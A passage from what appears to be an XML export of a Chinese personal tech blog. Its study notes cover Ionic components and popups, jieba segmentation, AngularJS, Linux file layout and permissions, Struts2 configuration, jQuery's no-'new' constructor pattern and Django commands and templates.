    <content type="text"><![CDATA[ion-nav-view加载ion-nav-view标签可以用来导航页面，并可以制作导航时候的页面动画，建议页面过渡的动作：’slide-left-right’,’slide-left-right-ios7’,’slide-in-up’。12&lt;ion-nav-view animation="slide-left-right"&gt;&lt;/ion-nav-view&gt; 利用$stateProvider进行渲染123456789101112var app = angular.module('myApp', ['ionic']);app.config(function($stateProvider) &#123; $stateProvider .state('index', &#123; url: '/', templateUrl: 'home.html' &#125;) .state('music', &#123; url: '/music', templateUrl: 'music.html' &#125;);&#125;); 在app启动时$stateProvider就会检查url，检查它的索引匹配状态，然后把home.html加载到内，页面由指定的URL加载。 ion-header-bar添加一个header栏123456789101112&lt;ion-header-bar align-title="left" class="bar-positive"&gt; &lt;div class="buttons"&gt; &lt;button class="button" ng-click="doSomething()"&gt;左侧按钮&lt;/button&gt; &lt;/div&gt; &lt;h1 class="title"&gt;Title!&lt;/h1&gt; &lt;div class="buttons"&gt; &lt;button class="button"&gt;右侧按钮&lt;/button&gt; &lt;/div&gt;&lt;/ion-header-bar&gt;&lt;ion-content&gt; 一些内容!&lt;/ion-content&gt; align-title属性：标题对齐的位置，值可为”left”,”right”,或者”center”.默认为”center”。 ion-footbar-bar添加页脚123456789101112&lt;ion-content&gt; 一些内容!&lt;/ion-content&gt;&lt;ion-footer-bar align-title="left" class="bar-assertive"&gt; &lt;div class="buttons"&gt; &lt;button class="button"&gt;左侧按钮&lt;/button&gt; &lt;/div&gt; &lt;h1 class="title"&gt;Title!&lt;/h1&gt; &lt;div class="buttons" ng-click="doSomething()"&gt; &lt;button class="button"&gt;右侧按钮&lt;/button&gt; &lt;/div&gt;&lt;/ion-footer-bar&gt; align-title同上 选项卡123456789101112131415&lt;ion-tabs class="tabs-positive tabs-icon-only"&gt; &lt;ion-tab title="首页" icon-on="ion-ios7-filing" icon-off="ion-ios7-filing-outline"&gt; &lt;!-- 标签 1 内容 --&gt; &lt;/ion-tab&gt; &lt;ion-tab title="关于" icon-on="ion-ios7-clock" icon-off="ion-ios7-clock-outline"&gt; &lt;!-- 标签 2 内容 --&gt; &lt;/ion-tab&gt; &lt;ion-tab title="设置" icon-on="ion-ios7-gear" icon-off="ion-ios7-gear-outline"&gt; &lt;!-- 标签 3 内容 --&gt; &lt;/ion-tab&gt;&lt;/ion-tabs&gt; 侧栏菜单12345678910111213&lt;ion-side-menus&gt; &lt;!-- 中间内容 --&gt; &lt;ion-side-menu-content ng-controller="ContentController"&gt; &lt;/ion-side-menu-content&gt; &lt;!-- 左侧菜单 --&gt; &lt;ion-side-menu side="left"&gt; &lt;/ion-side-menu&gt; &lt;!-- 右侧菜单 --&gt; &lt;ion-side-menu side="right"&gt; &lt;/ion-side-menu&gt;&lt;/ion-side-menus&gt; 12345function ContentController($scope, $ionicSideMenuDelegate) &#123; $scope.toggleLeft = function() &#123; $ionicSideMenuDelegate.toggleLeft(); &#125;;&#125; delegate-handle属性，该句柄用来标识带有$ionicSideMenuDelegate的侧栏菜单侧栏菜单分三部分中间内容，左侧栏，右侧栏，控制侧栏出现和隐藏应该在中间内容中。外面被包裹。中间内容由包裹，侧栏由包裹，side属性控制左右。$ionicSideMenuDelegate.toggleLeft()服务控制侧栏显示隐藏。menu-toggle属性打开指定侧栏菜单,menu-close属性关闭当前打开的侧栏菜单。 弹出窗口123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263angular.module('mySuperApp', ['ionic']).controller(function($scope, $ionicPopup, $timeout) &#123; // 触发一个按钮点击，或一些其他目标 $scope.showPopup = function() &#123; $scope.data = &#123;&#125; // 一个精心制作的自定义弹窗 var myPopup = $ionicPopup.show(&#123; template: '&lt;input type="password" ng-model="data.wifi"&gt;', title: 'Enter Wi-Fi Password', subTitle: 'Please use normal things', scope: $scope, buttons: [ &#123; text: 'Cancel' &#125;, &#123; text: '&lt;b&gt;Save&lt;/b&gt;', type: 'button-positive', onTap: function(e) &#123; if (!$scope.data.wifi) &#123; //不允许用户关闭，除非他键入wifi密码 e.preventDefault(); &#125; else &#123; return $scope.data.wifi; &#125; &#125; &#125;, ] &#125;); myPopup.then(function(res) &#123; console.log('Tapped!', res); &#125;); $timeout(function() &#123; myPopup.close(); //由于某种原因3秒后关闭弹出 &#125;, 3000); // 一个确认对话框 $scope.showConfirm = function() &#123; var confirmPopup = $ionicPopup.confirm(&#123; title: 'Consume Ice Cream', template: 'Are you sure you want to eat this ice cream?' &#125;); confirmPopup.then(function(res) &#123; if(res) &#123; console.log('You are sure'); &#125; else &#123; console.log('You are not sure'); &#125; &#125;); &#125;; // 一个提示对话框 $scope.showAlert = function() &#123; var alertPopup = $ionicPopup.alert(&#123; title: 'Don\'t eat that!', template: 'It might taste good' &#125;); alertPopup.then(function(res) &#123; console.log('Thank you for not eating my delicious ice cream cone'); &#125;); &#125;; &#125;;&#125;); show(可选)显示一个复杂的对话框。一个带有按钮组的复杂弹窗，每个按钮带有一个文本 和 类型字段，此外还有一个 onTap功能。当点击弹窗上的相关按钮，会触发onTap函数，默认会关闭弹窗，处理弹窗的返回值。如果你想阻止默认动作，点击按钮保持打开弹窗，当点击一个事件时，触发event.preventDefault()。详见如下表格。 参数 类型 详情 options object 新弹窗的选项的表现形式见下 12345678910111213141516171819202122&#123; title: '', // String. 弹窗的标题。 subTitle: '', // String (可选)。弹窗的子标题。 template: '', // String (可选)。放在弹窗body内的html模板。 templateUrl: '', // String (可选)。在弹窗body内的html模板的URL。 scope: null, // Scope (可选)。一个链接到弹窗内容的scope（作用域）。 buttons: [&#123; //Array[Object] (可选)。放在弹窗footer内的按钮。 text: 'Cancel', type: 'button-default', onTap: function(e) &#123; // 当点击时，e.preventDefault() 会阻止弹窗关闭。 e.preventDefault(); &#125; &#125;, &#123; text: 'OK', type: 'button-positive', onTap: function(e) &#123; // 返回的值会导致处理给定的值。 return scope.data.response; &#125; &#125;]&#125; 返回: object 当关闭弹窗时，处理一个promise。有一个附加的关闭函数，用于利用程序关闭弹窗。alert(可选)显示一个带有一段信息和一个用户可以点击关闭弹窗的按钮的简单提示弹窗。 参数 类型 详情 options object 显示提示的选项形式见下 12345678&#123; title: '', // String. 弹窗的标题。 subTitle: '', // String (可选)。弹窗的子标题。 template: '', // String (可选)。放在弹窗body内的html模板。 templateUrl: '', // String (可选)。 放在弹窗body内的html模板的URL。 okText: '', // String (默认: 'OK')。OK按钮的文字。 okType: '', // String (默认: 'button-positive')。OK按钮的类型。&#125; 返回: object 当弹窗关闭时，处理的一个 promise。有一个额外的关闭函数，可以被带有任何给定的值的关闭程序调用。confirm(可选)显示一个简单的带有一个取消和OK按钮的对话框弹窗。 如果用户点击OK按钮，就设置promise为true，如果用户点击取消按钮则为false。 参数 类型 详情 options object 显示对话框弹窗选项见下 12345678910&#123; title: '', // String. 弹窗标题。 subTitle: '', // String (可选)。弹窗的副标题。 template: '', // String (可选)。放在弹窗body内的html模板。 templateUrl: '', // String (可选)。放在弹窗body内的一个html模板的URL。 cancelText: '', // String (默认: 'Cancel')。一个取消按钮的文字。 cancelType: '', // String (默认: 'button-default')。取消按钮的类型。 okText: '', // String (默认: 'OK')。OK按钮的文字。 okType: '', // String (默认: 'button-positive')。OK按钮的类型。&#125; 返回: object 当关闭对话框时，处理的一个promise。当弹窗关闭时，处理的一个 promise。有一个额外的关闭函数，可以被带有任何给定的值的关闭程序调用。prompt(可选)显示一个简单的提示弹窗，带有一个input， OK 按钮，和取消按钮。如果用户点击OK，就设置promise的值，如果用户点击取消，则值为未定义。12345678$ionicPopup.prompt(&#123; title: 'Password Check', template: 'Enter your secret password', inputType: 'password', inputPlaceholder: 'Your password' &#125;).then(function(res) &#123; console.log('Your password is', res); &#125;); 参数 类型 详情 options object 显示对话框弹窗选项见下 123456789101112&#123; title: '', // String. 弹窗的标题。 subTitle: '', // String (可选)。弹窗的副标题。 template: '', // String (可选)。放在弹窗body内的html模板。 templateUrl: '', // String (可选)。放在弹窗body内的html模板的URL。 inputType: // String (默认: 'text')。input的类型。 inputPlaceholder: // String (默认: '')。input的 placeholder。 cancelText: // String (默认: 'Cancel')。取消按钮的文字。 cancelType: // String (默认: 'button-default')。取消按钮的类型。 okText: // String (默认: 'OK')。OK按钮的文字。 okType: // String (默认: 'button-positive')。OK按钮的类型。&#125; 返回: object 当关闭对话框时，处理的一个promise。当弹窗关闭时，处理的一个 promise。有一个额外的关闭函数，可以被带有任何给定的值的关闭程序调用。 平台$ionicPlatform一个angular抽象的ionic.Platform。 用来检测当前的平台，以及诸如在PhoneGap/Cordova中覆盖Android后退按钮。方法onHardwareBackButton(callback)一些平台有硬件的后退按钮，因此可以用这种方法绑定到它。 参数 类型 详情 callback function 当该事件发生时，触发回调函数。 offHardwareBackButton(callback)移除一个后退按钮的监听事件。 参数 类型 详情 callback function 最初绑定的监视器函数。 registerBackButtonAction(callback, priority, [actionId])注册一个硬件后退按钮动作。当点击按钮时，只有一个动作会执行，因此该方法决定了注册的后退按钮动作具有最高的优先级。 例如，如果一个动作表已经显示，后退按钮应该关闭这个动作表，但是它不应该还能返回一个页面视图或关闭一个打开的模型。 参数 类型 详情 callback function 当点击返回按钮时触发，如果该监视器具有最高的优先级。 priority number 仅最高优先级的会执行。 actionId(可选) * 该id指定这个动作。默认：一个随机且唯一的id。 返回: function 一个被触发的函数，将会注销该后退按钮动作。ready([callback])一旦设备就绪，则触发一个回调函数，或如果该设备已经就绪，则立即调用。 参数 类型 详情 callback function= 触发的函数。 返回: promise 当设备就绪后，就会解决一个 promise。 ionic.Platform工具方法ready(callback)设备就绪后触发一个回调函数，或如果设备已经就绪理解触发。该方法可以随处运行而无需通过任何附加方法封装。当一个app包含一个web视图（Cordova），当设备就绪后它将会触发回调函数。如果该app包含一个web浏览器，它会在window.load之后触发回调。 参数 类型 详情 callback function 调用的函数 device()返回当前设备（通过cordova提供）。 返回: 对象设备对象。isWebView()返回: boolean验证我们是否附带web视图运行（比如Cordova）。isIPad()返回: boolean 是否在iPad上运行。isIOS()返回: boolean 是否在iOS上运行。isAndroid()返回: boolean 是否在Android上运行。isWindowsPhone()返回: boolean 是否在Windows手机上运行。platform()返回: string 当前平台的名字。version()返回: string 当前设备平台的版本。exitApp()退出app。showStatusBar(shouldShow)显示或隐藏设备状态栏（用Cordova）。fullScreen([showFullScreen], [showStatusBar])设置app是否全屏（用Cordova）。 参数 类型 详情 showFullScreen(可选) boolean 是否设置app全屏。默认为true。 showStatusBar(可选) boolean 是否显示设备状态栏。默认为false。 属性boolean isReady设备是否就绪。boolean isFullScreen设备是否全屏。Array(string) platforms一个所有平台的数组。string grade当前平台是什么级别的。]]></content>
      <categories>
        <category>html</category>
        <category>ionic</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jieba分词]]></title>
    <url>%2F2016%2F12%2F18%2Fsixth%2F</url>
    <content type="text"><![CDATA[分词1、li=jieba.cut(“我来到襄阳三十六中”,cut_all=True) li是可循环对象 #全模式2、li=jieba.cut(“我来到襄阳三十六中”,cut_all=False) #精确模式3、li=jieba.cut(“我来到襄阳三十六中”) #默认是精确模式4、li=jieba.cut_for_search(“我来到襄阳三十六中”)#搜索引擎模式5、添加自定义词典 jieba.load_userdict(file_name)词典格式和dict.txt一样，一个词占一行；每一行分三部分，一部分为词语，另一部分为词频，最后为词性（可省略），用空格隔开示例：123456云计算 5李小福 2 nr创新办 3 ieasy_install 3 eng好用 300韩玉赏鉴 3 nz 7、difflib比较文本相似度模块]]></content>
      <categories>
        <category>python</category>
        <category>jieba</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[angularjs初步]]></title>
    <url>%2F2016%2F12%2F18%2Ffourth%2F</url>
    <content type="text"><![CDATA[创建原件module,controller,filter,directive. 服务\$scope,\$http,\$pristine,(未修改)\$dirty(已修改),\$valid,(合法)\$invalid,(不合法)\$error,(表单中的验证)\$focused,\$apply 指令require,ng-minleng,ng-maxleng,ng-pattern,ng-pristine,ng-dirty,ng-valid,ng-invalid. 常用过滤器filter:针对字符串，对象，函数,json针对对象,limitTo针对字符串，数组,lowercase针对字符串,number针对数字,orderby针对函数，字符串，数组,uppercase针对字符串,自定义过滤器。 自定义指令四中声明指令方法，EACM规定声明指令方式，表达式，ng-controller提供的作用域，@绑定策略，=绑定策略(双向数据绑定)，指令四个属性:restrict,replace,scope,template]]></content>
      <categories>
        <category>JavaScript</category>
        <category>angularjs</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux系统初步了解]]></title>
    <url>%2F2016%2F12%2F18%2Fthird%2F</url>
    <content type="text"><![CDATA[计算机核心：cpu,内存，硬盘。linux档案系统:/bin(用户公用命令),/etc(配置文件),/sbin(管理员命令),/dev(区块设备和字符设备),/lib(函数库)(这五个必须与根目录在一起)。/boot(开机启动文件),/home(用户与组的信息),/media(可移动的媒体，比如软盘，光盘，u盘),/mnt,/opt(第三方协力软件),/root(root用户),/usr(用户安装软件，里面还有个local是用户下载的第三方软件安装),/tmp。/etc/init.d/下面都是服务名，/lib/module/下面是第三方的库。档案权限：chown,chgrp,chmod.[-d(目录)l(链接)b(存取)c(读取)]rwxrwxrwx421421421 u[+-=]rwx,g[+-=]rwx,o[+-=]rwx.man is,info is,/etc/shadow]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaSSH框架初步]]></title>
    <url>%2F2016%2F12%2F18%2Fsecond%2F</url>
    <content type="text"><![CDATA[Struts2核心包asm-3.3.jarasm-commons-3.3.jarasm-tree-3.3.jarcommons-fileupload-1.2.2.jarcommons-io-2.0.1.jarcommons-lang3-3.1.jarcommons-loggin-1.1.1.jarfreemarker-2.3.19.jarjavassist-3.11.0.GA.jarognl-3.0.5.jarstrut2-core-2.3.4.jarxwork-core-2.3.4.jar Struts action的包控制12345678&lt;package name="train" namespace="/" extends="struts-default"&gt; &lt;action name="hello" class="com.train.struts.HelloWorld"&gt; &lt;result name="success"&gt;/hello_world.jsp&lt;/result&gt; &lt;/action&gt; &lt;action name="login" class="com.train.action.UserAction" method="login"&gt; &lt;result name="success"&gt;/hello_world.jsp&lt;/result&gt; &lt;/action&gt; &lt;/package&gt; package表示一个包，name是包名，这个主要用于以后的包继承，namescpace是命名空间，这个主要是跟随在url访问路由后面，extends是继承，一般一个action包都要继承Struts-default或者json-default才能实现各种拦截，因为Struts-default或json-default有很多拦截器。action表示一个行为，name是行为命，也就是客户端指示要做的行为，class是处理这个行为的类，method是在这个类里面用哪个方法处理这个行为。result是处理方法返回的结果并交给视图，name是规定哪个result处理这个行为，并转交给jsp或html。 Struts.xml默认值如果没有为action class指定类默认为ActionSupport类。如果没有为action method指定方法默认为execute方法。如果没有为result name指定视图名默认为success名。 Struts2视图详解视图转发有dispatcher，redirect，redirectAction，plainText通过$(username)访问类里面的属性，类里面的属性必须有get方法。通过&lt;%=%&gt;进行java代码嵌入完成jspurl传递中文。url编码：URLEncoder.encode(“”,”编码方式”);对字符串进行编码。URLDecoder.decode(“”,”解码方式”);对字符串进行解码。全视图：123&lt;global-results&gt; &lt;result name="message"&gt;/WEB-INF/page/message.jsp&lt;/result&gt;&lt;/global-results&gt; 不同包访问全视图：继承包 重定向默认转发1&lt;result name="success"&gt;/WEB-INF/jsp/home.jsp&lt;/result&gt; 浏览器重定向1&lt;result name="success" type="redirect"&gt;/WEB-INF/jsp/home.jsp&lt;/result&gt; 服务端请求转发Action1&lt;result name="success" type="redirectAction"&gt;Action名称&lt;/result&gt; 服务端请求转发不同包的Action(param标签主要用来注入值)1234&lt;result name="success" type="redirectAction"&gt;&lt;param name="actionName"&gt;XXX&lt;/param&gt;&lt;param name="namespace"&gt;/control/department&lt;/param&gt;&lt;/result&gt; 路径搜索。原样显示出内容。123&lt;result name="success" type="plainText"&gt;/WEB-INF/page/yuandaima.jsp&lt;/result&gt; 解决中文乱码问题，注入参数。1234&lt;result name="resource" type="plainText"&gt;&lt;param name="location"&gt;/xxx.jsp&lt;param&gt;&lt;param name="charSet"&gt;UTF-8&lt;param&gt;&lt;/result&gt; 类注入值1234&lt;action name="list" class="cn.itcast.action.HelloWorld" extends="struts-default"&gt; &lt;param name="savepath"&gt;/images&lt;/param&gt; &lt;result name="success"&gt;/WEB-INF/page/message.jsp&gt;&lt;result&gt;&lt;/action&gt; struts2常量配置1&lt;constant name="struts.action.extension" value="do,action"/&gt; 使访问的后缀从.action 变为.dostruts2加载常量顺序struts-default.xmlstruts-plugin.xmlstruts.xmlstruts.propertiesweb.xml如果定义了多个，则按此顺序加载。常用配置常量123456789101112131415161718指定默认编码集，作用于HTTPServerRequest的setCharacterEncoding方法和freemarker、velocity的输出&lt;constant name="struts.i18n.encoding" value="UTF-8"/&gt;该属性指定需要Struts2处理的请求后缀，该属性的默认值为action，即所有匹配*.action的请求都由Struts2处理。如果用户需要指定多个请求后缀，则多个后缀之间以英文符号(,)隔开。&lt;constant name="struts.action.extension" value="do"/&gt;设置浏览器是否缓存静态内容，默认值为true(生产环境使用)，开发阶段最好关闭。&lt;constant name="struts.serve.static.browserCache" value="false"/&gt;当Struts的配置文件修改后，系统是否自动重新加载该文件，默认值为false(生产环境下使用)，开发阶段最好打开&lt;constant name="struts.configuration.xml.reload" value="false"/&gt;开发模式下使用，这样可以打印更详细的错误&lt;constant name="struts.devMode" value="true"/&gt;默认的视图主题&lt;constant name="struts.ui.theme" value="simple"/&gt;与spring集成时，指定由spring负责action对象的创建&lt;constant name="struts.objectFactory" value="spring"/&gt;该属性设置struts2是否支持动态方法调用，该属性的默认值为true，如果需要关闭动态方法调用，则可设置为false。&lt;contant name="struts.enable.DynamicMathodInvocation" value="false"/&gt;上传文件的大小限制&lt;contant name="struts.multipart.maxSize" value="10701096"/&gt; Struts2处理流程通过web.xml过滤所有路径(filter标签)，如果匹配进入Struts2框架，接着进入StrutsPrepareAndExecuteFilter-&gt;Interceptor-&gt;Action-&gt;Result-&gt;Jsp/Html]]></content>
      <categories>
        <category>Java</category>
        <category>SSH</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery原理深究]]></title>
    <url>%2F2016%2F12%2F18%2Ffirst%2F</url>
    <content type="text"><![CDATA[jQuery的无new构建直接使用$(‘’)其实就是一种无new构造方式的时候，其本质就是相当于new jQuery()，那么jQuery内部是如何运行的呢？123456789101112131415(function(window, undefined) &#123; var // ... jQuery = function(selector, context) &#123; // The jQuery object is actually just the init constructor 'enhanced' return new jQuery.fn.init(selector, context, rootjQuery); &#125;, jQuery.fn = jQuery.prototype = &#123; init: function(selector, context, rootjQuery) &#123; // ... &#125; &#125; jQuery.fn.init.prototype = jQuery.fn;&#125;)(window); 首先我们要知道函数声明和函数表达式在ECMAScript中，创建函数的最常用的两个方法是函数表达式和函数声明，两者期间的区别是函数声明必须带有标识符(就是我们常说的函数名),而函数表达式则可以省略这个标识符。123456function foo()&#123;&#125; // 声明，因为它是程序的一部分var bar = function foo()&#123;&#125;; // 表达式，因为它是赋值表达式的一部分new function bar()&#123;&#125;; // 表达式，因为它是new表达式(function()&#123; function bar()&#123;&#125; // 声明，因为它是函数体的一部分&#125;)(); 还有一种函数表达式不太常见，就是被括号括住的(function foo(){}),他是表达式的原因是因为括号()是一个分组操作符，它的内部只能包含表达式。123(function(window, undefined) &#123; /...&#125;)(window) 可以将上面的代码结构分成两部分:(function(){window,undefined})和(window),第一个()是表达式，而这个表达式本身是一个匿名函数，所以在第一个表达式后面加(window)就表示执行这个匿名函数并传入参数window。 原型prototype在JavaScript中，原型也是一个对象，通过原型可以实现对象的属性继承，JavaScript的对象中都包含了一个”[[Prototype]]”内部属性，这个属性所对应的就是该对象的原型。对于”prototype”和”proto“这个两个属性有的时候可能会弄混，”Person.prototype”和”Person.proto“是完全不同的。说一下”prototype”和”proto“进行简单的介绍：1、对于所有的对象，都有proto属性，这个属性对应该对象的原型。2、对于函数对象，除了proto属性之外，还有prototype属性，当一个函数被用作构造函数来创建实例时，该函数的prototype属性值将被作为原型赋值给所有对象实例(也就是设置实例的proto属性)12345678910function Person(name, age)&#123; this.name = name; this.age = age;&#125;Person.prototype.getInfo = function()&#123; console.log(this.name + " is " + this.age + " years old");&#125;;//调用var will = new Person("Will", 28);will.getInfo();//"Will is 28 years old" 闭包闭包的定义：当一个内部函数被其外部函数之外的变量引用时，就形成了一个闭包。闭包的作用：在了解闭包的作用之前，我们先了解一下JavaScript中的GC机制：在JavaScript中，如果一个对象不再被引用，那么这个对象就会被GC回收，否则这个对象一直会保存在内部中。举个例子，B定义在A中，因此B依赖于A，而外部变量C又引用了B，所以A间接的被C引用，也就是说，A不会被GC回收，会一直保存在内存中。123456789101112function A()&#123; var count = 0; function B()&#123; count ++; console.log(count); &#125; return B;&#125;var c = A();c();// 1c();// 2c();// 3 count是A中的一个变量，它的值在B中被改变，函数B每执行一次，count的值就在原来的基础上累加1,。因此，A中的count一直保存在内存中。这就是闭包的作用，有时候我们需要一个模块中定义这样一个变量：希望这个变量一直保存在内存中但又不会“污染”全局的变量，这个时候，我们就可以用闭包来定义这个模块。 分析jQuery源码：1234567891011121314(function(window, undefined) &#123; var // ... jQuery = function(selector, context) &#123; // The jQuery object is actually just the init constructor 'enhanced' return new jQuery.fn.init(selector, context, rootjQuery); &#125;, jQuery.fn = jQuery.prototype = &#123; init: function(selector, context, rootjQuery) &#123; // ... &#125; &#125; jQuery.fn.init.prototype = jQuery.fn;&#125;)(window); jQuery.fn的init函数被jQuery的构造函数调用了，这里形成了一个闭包。构造函数及调用代码：12345// ... jQuery = function(selector, context) &#123; // The jQuery object is actually just the init constructor 'enhanced' return new jQuery.fn.init(selector, context, rootjQuery); &#125;, 如何实现无new构建JavaScript是函数式语言，函数可以实现类，类就是面向对象编程中最基本的概念12345678910var aQuery = function(selector, context) &#123; //构造函数&#125;aQuery.prototype = &#123; //原型 name:function()&#123;&#125;, age:function()&#123;&#125;&#125;var a = new aQuery();a.name(); jQuery不是这样实现的，要实现，首先要把jQuery看成一个类，那么$()应该是返回类的实例才对，所以修改代码：1234567var aQuery = function(selector, context) &#123; return new aQuery();&#125;aQuery.prototype = &#123; name:function()&#123;&#125;, age:function()&#123;&#125;&#125; 通过new aQuery(),虽然返回的是一个实例，但是也能看出很明显的问题，死循环。解决如何返回一个正确的实例：那么就要想到实例this只跟原型有关系。利用工厂方法来创建实例，把这个方法放到aQuery.prototype原型中12345678910var aQuery = function(selector, context) &#123; return aQuery.prototype.init(selector);&#125;aQuery.prototype = &#123; init:function(selector)&#123; return this; &#125; name:function()&#123;&#125;, age:function()&#123;&#125;&#125; 很明显aQuery()返回的是aQuery类的实例，那么在init中的this其实也是指向的aQuery类的实例，问题来了init的this指向的是aQuery类，如果把init函数也当作一个构造器，那么内部的this要如何处理？123456789101112var aQuery = function(selector, context) &#123; return aQuery.prototype.init(selector);&#125;aQuery.prototype = &#123; init: function(selector) &#123; this.age = 18 return this; &#125;, name: function() &#123;&#125;, age: 20&#125;aQuery().age //18 因为this只是指向aQuery类的，所以aQuery的age属性是可以被修改的。这样看似没有问题，其实问题很大的。为什么是new jQuery.fn.init?看如下代码：1234567891011121314var aQuery = function(selector, context) &#123; return aQuery.prototype.init(selector);&#125;aQuery.prototype = &#123; init: function(selector) &#123; if(selector=="a") this.age = 18 return this; &#125;, name: function() &#123;&#125;, age: 20&#125;aQuery("a").age //18aQuery("b").age //18 当我调用传入”a” 的时候，修改age=18，及aQuery(“a”).age的值为18但是当我传入”b”的时候并没有修改age的值，我也希望得到默认age的值20，但是aQuery(“b”).age的值为18.因为在调用aQuery(“a”).age的时候age被修改了。这样的情况下就出错了，所以需要设计出独立的作用域才行。 jQuery框架分隔作用域的处理1234jQuery = function( selector, context ) &#123; // The jQuery object is actually just the init constructor 'enhanced' return new jQuery.fn.init( selector, context, rootjQuery ); &#125;, 很明显通过实例init函数，每次都构建新的init实例对象，来分隔this，避免交互混淆。再次修改代码：123456789101112131415var aQuery = function(selector, context) &#123; return new aQuery.prototype.init(selector);&#125;aQuery.prototype = &#123; init: function(selector) &#123; if(selector=="a") this.age = 18 return this; &#125;, name: function() &#123;&#125;, age: 20&#125;aQuery("a").age //18aQuery("b").age //undefinedaQuery("a").name() //Uncaught TypeError: Object [object Object] has no method 'name' 又来一个问题age:undefined,name():抛出错误，无法找到这个方法，所以很明显new的init跟jQuery类的this分离了。7、怎么访问jQuery类原型上的属性与方法做到既能隔离作用域还能使用jQuery原型对象的作用域，还能在返回实例中访问jQuery的原型对象？关键点12// Give the init function the jQuery prototype for later instantiationjQuery.fn.init.prototype = jQuery.fn; 我们改一下：12345678910111213141516171819var aQuery = function(selector, context) &#123; return new aQuery.prototype.init(selector);&#125;aQuery.prototype = &#123; init: function(selector) &#123; if(selector=="a") this.age = 18 return this; &#125;, name: function() &#123; return age; &#125;, age: 20&#125;aQuery.prototype.init.prototype = aQuery.prototype; aQuery("a").age //18aQuery("b").age //20aQuery("a").name() //20 我们再看一遍jQuery源码：1234567891011121314(function(window, undefined) &#123; var // ... jQuery = function(selector, context) &#123; // The jQuery object is actually just the init constructor 'enhanced' return new jQuery.fn.init(selector, context, rootjQuery); &#125;, jQuery.fn = jQuery.prototype = &#123; init: function(selector, context, rootjQuery) &#123; // ... &#125; &#125; jQuery.fn.init.prototype = jQuery.fn;&#125;)(window); 发现一切都是套路，哈哈。说一下jQuery的几个绝妙之处：1jQuery.fn.init.prototype = jQuery.fn 解析一下：1、首先要明确，使用$(‘xxx’) 这种实例化方式，其内部调用的是1return new jQuery.fn.init(selector, context, rootjQuery) 这一句话，也就是构造实例时交给了1jQuery.fn.init() 方法去完成。2、将jQuery.fn.init的prototype属性设置为jQuery.fn，那么使用new jQuery.fn.init()生成的对象的原型对象就是jQuery.fn，所以挂载到jQuery.fn上面的函数就相当于挂载到jQuery.fn.init()生成的jQuery对象上，所有使用new jQuery.fn.init()生成的对象也能访问到jQuery.fn上的所哟原型方法。3、所以实例化方法存在这么一个关系链 &nbsp;&nbsp;&nbsp;&nbsp;1.jQuery.fn.init.prototype=jQuery.fn=jQuery.prototype; &nbsp;&nbsp;&nbsp;&nbsp; 2.new jQuery.fn.init()相当于new jQuery(); &nbsp;&nbsp;&nbsp;&nbsp; 3.jQuery()返回的是new jQuery.fn.init(),而var obj=new jQuery(),所以这2者是相当的，所以我们可以无new 实例化jQuery对象。]]></content>
      <categories>
        <category>JavaScript</category>
        <category>jQuery</category>
      </categories>
      <tags>
        <tag>理解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[django初步]]></title>
    <url>%2F2016%2F12%2F18%2Ffifth%2F</url>
    <content type="text"><![CDATA[命令使用1、创建django项目：django-admin startproject djangodemo12、创建django应用：python manage.py startapp login3、自动创建表：python manage.py makemigrations,python manage.py migrate4、使用开发服务器:python manage.py runserver5、清空数据库：python manage.py flush6、创建超级管理员:python manage.py createsuperuser7、导出数据:python manage.py dumpdata appname&gt;appname.json8、导入数据:python manage.py loaddata appname.json9、项目环境终端python manage.py shell10、数据库命令行python manage.py dbshell11、更多命令python manage.py12、新建项目后生成一个文件夹主要是项目的设置文件13、新建项目，新建应用14、定义视图函数（访问页面时的内容） django的get，post方法与express的get，post方法不同12345def add(request): a=request.GET['a'] b=request.GET['b'] c=int(a)+int(b) return HttpResponse(str(c)) url匹配参数与express不同123def add2(request,a,b): c=int(a)+int(b) return HttpResponse(str(c)) 巧妙访问网页1234不带参数的：&#123;% url &apos;name&apos; %&#125;带参数的：参数可以是变量名&#123;% url &apos;name&apos; 参数 %&#125; 模板：模板中的for循环，条件判断，常用的标签，过滤器的使用。for循环示例：12345678列表类型：&#123;% for i in TutorialList %&#125;&#123;&#123; i &#125;&#125;&#123;% endfor %&#125;字典类型：&#123;% for key, value in info_dict.items %&#125; &#123;&#123; key &#125;&#125;: &#123;&#123; value &#125;&#125;&#123;% endfor %&#125; if条件判断示例：123&#123;% for item in List %&#125; &#123;&#123; item &#125;&#125;&#123;% if not forloop.last%&#125;,&#123;% endif %&#125; &#123;% endfor %&#125; for循环常用循环位置判断： 变量 描述 forloop.counter 索引从 1 开始算 forloop.counter0 索引从 0 开始算 forloop.revcounter 索引从最大长度到 1 forloop.revcounter0 索引从最大长度到 0 forloop.first 当遍历的元素为第一项时为真 forloop.last 当遍历的元素为最后一项时为真 forloop.parentloop 用在嵌套的 for 循环中，获取上一层 for 循环的 forloop 当列表中可能为空值时用 for empty1234567&lt;ul&gt;&#123;% for athlete in athlete_list %&#125; &lt;li&gt;&#123;&#123; athlete.name &#125;&#125;&lt;/li&gt;&#123;% empty %&#125; &lt;li&gt;抱歉，列表为空&lt;/li&gt;&#123;% endfor %&#125;&lt;/ul&gt; 模板中的逻辑操作：1234567891011&#123;% if var &gt;= 90 %&#125;成绩优秀，自强学堂你没少去吧！学得不错&#123;% elif var &gt;= 80 %&#125;成绩良好&#123;% elif var &gt;= 70 %&#125;成绩一般&#123;% elif var &gt;= 60 %&#125;需要努力&#123;% else %&#125;不及格啊，大哥！多去自强学堂学习啊！&#123;% endif %&#125; and,or,not,in,not in也可以在模板中使用12345&#123;% if num &lt;= 100 and num &gt;= 0 %&#125;num在0到100之间&#123;% else %&#125;数值不在范围之内！&#123;% endif %&#125; 判断用户是否登录12345&#123;% if request.user.is_authenticated %&#125; &#123;&#123; request.user.username &#125;&#125;，您好！&#123;% else %&#125; 请登陆，这里放登陆链接&#123;% endif %&#125; 数据库模型1234567891011121314151617181920212223242526from django.db import models class Person(models.Model): name = models.CharField(max_length=30) age = models.IntegerField()python manage.py syncdb # 进入 manage.py 